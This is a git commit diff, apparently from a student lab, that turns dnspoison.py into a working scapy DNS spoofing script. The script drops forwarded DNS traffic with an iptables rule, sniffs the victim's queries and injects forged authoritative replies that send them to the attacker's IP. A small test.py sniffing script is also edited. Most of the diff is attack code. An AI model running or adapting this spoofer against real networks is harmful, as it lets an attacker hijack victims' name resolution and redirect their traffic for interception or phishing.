5c7e3b29affa81daa2f7acec55d91af0ab4bbcc4
m4ul <hansonlucas06@gmail.com>
2022-11-10 20:13:46 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -1,13 +1,26 @@
-from scapy.all import sniff, DNS, DNSQR, DNSRR
+from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR
+from subprocess import Popen, PIPE
 
+domain = 'reverseproxy.ynov.com.'
+victimIP = "10.5.1.2"
+routerIP = "10.5.1.254"
+ownIP = "10.5.1.3"
+gotoIP = "10.5.1.3"
 
-a=sniff(count=1, prn=lambda x: x.show(), filter="port 53",promisc=1)
-if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-    print (a[0].getlayer(DNS).qd.qname)
-    print (a[0].getlayer(DNS).qd.qtype)
-    print (a[0].getlayer(DNS).qd.qclass)
-    print (a[0].getlayer(DNS).id)
-    print (a[0].getlayer(DNS).an)
-    print (a[0].getlayer(DNS).ns)
-    print (a[0].getlayer(DNS).ar)
+def forwarding():
+    firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
+    Popen([firewall], shell=True, stdout=PIPE)
 
+def sniffDNS():
+    sniff(filter="udp and port 53", prn = spoofDNS)
+
+def spoofDNS(packet):
+    if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
+        srp((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
+
+if __name__ == '__main__':
+    forwarding()
+
+    sniffDNS()
+
+    spoofDNS()
--- test.py
+++ test.py
@@ -3,10 +3,9 @@ from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP
 domain = 'reverseproxy.ynov.com.'
 
 a=sniff(count=1, prn=lambda x: x.show(), filter="port 53",promisc=1)
-if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-    if domain in str(a[0].getlayer(DNS).qd.qname):
-        print("it works")
-    #ipdest = 
-    #udpdestport = 
-    #dnsid = 
+#if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
+ #   if domain in str(a[0].getlayer(DNS).qd.qname):
+  #      ipdest = 
+   #     udpdestport = 
+    #    dnsid = 
 
